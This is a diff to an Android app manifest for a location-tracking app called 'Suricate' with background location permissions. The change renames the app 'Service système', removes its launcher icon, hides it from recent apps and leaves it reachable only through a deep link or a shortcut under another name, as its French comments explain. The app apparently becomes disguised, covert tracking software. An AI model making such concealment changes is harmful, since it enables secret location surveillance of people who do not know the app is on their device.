@@ -2,6 +2,8 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
@@ -17,18 +19,19 @@
     <application
         android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
-        android:label="Suricate"
+        android:label="Service système"
         android:usesCleartextTraffic="false"
         android:theme="@android:style/Theme.Material.Light">
 
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:launchMode="singleTop">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
+            android:launchMode="singleTop"
+            android:label="Service système"
+            android:excludeFromRecents="true">
+            <!-- Pas de catégorie LAUNCHER : aucune icône dans le tiroir d'applications ni les favoris.
+                 On rouvre l'écran uniquement via le lien suricate://enroll (navigateur, ou raccourci
+                 que vous créez vous-même ailleurs sous un autre nom). -->
             <!-- Lien du tableau de bord : suricate://enroll?server=...&code=... (pré-remplit seulement) -->
             <intent-filter>
                 <action android:name="android.intent.action.VIEW" />
